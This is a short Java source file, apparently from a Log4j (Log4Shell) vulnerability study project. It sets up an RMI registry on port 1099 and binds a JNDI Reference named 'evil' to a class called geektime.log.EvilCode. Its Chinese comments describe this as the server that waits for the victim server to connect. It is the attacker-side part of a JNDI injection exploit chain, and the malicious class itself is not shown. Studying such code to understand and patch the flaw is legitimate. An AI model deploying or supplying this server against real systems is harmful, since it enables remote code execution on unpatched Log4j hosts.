package com.fly.log4jbug;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


/**
 * @Title: 准备好RMI服务端，等待受害服务器访问
 * @ClassName: geektime.log.RMIServer.java
 * @Description:
 *
 * @Copyright 2020-2021  - Powered By 研发中心
 * @author: 王延飞
 * @date:  2022/1/6 16:23
 * @version V1.0
 */
public class RMIServer {
    public static void main(String[] args) {
        try {
            // 本地主机上的远程对象注册表Registry的实例,默认端口1099
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("Create RMI registry on port 1099");
            //返回的Java对象 第一个和第二个参数为包路径
            Reference reference = new Reference("geektime.log.EvilCode","geektime.log.EvilCode",null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            // 把远程对象注册到RMI注册服务器上，并命名为evil
            registry.bind("evil",referenceWrapper);
            // registry.bind("evil",new EvilCode());
        } catch (RemoteException | AlreadyBoundException | NamingException e) {
            e.printStackTrace();
        }
    }
}
